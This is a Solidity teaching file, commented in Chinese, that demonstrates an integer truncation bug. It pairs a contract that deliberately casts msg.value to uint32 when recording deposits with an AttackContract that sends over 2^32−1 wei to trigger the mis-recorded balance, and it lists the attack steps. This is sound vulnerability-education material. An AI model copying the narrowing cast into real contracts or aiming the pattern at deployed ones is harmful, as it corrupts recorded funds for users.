// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞名稱: Truncation Bugs
  描述: 此漏洞發生在資料型態轉換時，將一個變數由較大型別轉為較小型別（例如 uint256 -> uint32），造成資料截斷，可能導致記錄金額不正確。

  範例說明:
  此合約中的 balance 映射使用 uint32 來儲存存入的 Ether 數量，
  當攻擊者傳送超過 uint32 上限 (2^32 - 1) 的 Ether 時，msg.value 在轉型時會丟失部分資料，
  使得 balance 內的值與實際傳入的 Ether 金額不符。

  攻擊流程:
  1. 部署 VulnerableContract。
  2. 部署 AttackContract，部署時傳入 VulnerableContract 的地址 (需為 payable address)。
  3. 攻擊者透過 AttackContract 呼叫 attack() 並傳送大於 uint32 最大值 (約4.29e9 wei) 的 Ether。
  4. VulnerableContract 在 receive() 函數中將 msg.value 轉為 uint32，導致資料被截斷。
  5. 檢查餘額會發現錯誤，進而可能利用此漏洞進行後續攻擊或操控
*/

contract VulnerableContract {
    // 漏洞所在：使用 uint32 儲存 Ether 數額，可能導致截斷 (Truncation Bugs)
    mapping(address => uint32) public balance;

    // 接受 Ether 的 receive function (Solidity >=0.8.0 的正確語法)
    receive() external payable {
        // 將 msg.value (uint256) 轉型為 uint32 可能導致超出範圍的值被截斷
        balance[msg.sender] = uint32(msg.value);
    }

    // 查詢餘額的輔助函數
    function getBalance(address _addr) external view returns (uint32) {
        return balance[_addr];
    }
}

contract AttackContract {
    // 注意：_vulnerableAddr 需為 payable address，因為 VulnerableContract 有 payable fallback
    VulnerableContract public vulnerable;

    // 修改建構子參數為 payable address
    constructor(address payable _vulnerableAddr) {
        vulnerable = VulnerableContract(_vulnerableAddr);
    }

    // 攻擊函數：傳送超過 uint32 表示範圍的 Ether，觸發截斷漏洞
    function attack() external payable {
        // 使用 Unicode escape 序列避免中文編譯錯誤
        require(msg.value > type(uint32).max, "\u8ACB\u50B3\u9001\u8D85\u904E uint32 \u6700\u5927\u503C\u7684 Ether");
        // 呼叫 VulnerableContract 的 receive()
        (bool success, ) = address(vulnerable).call{value: msg.value}("");
        require(success, "Call failed");
    }

    // 檢查被截斷之後的餘額
    function checkTruncatedBalance() external view returns (uint32) {
        return vulnerable.getBalance(address(this));
    }
}
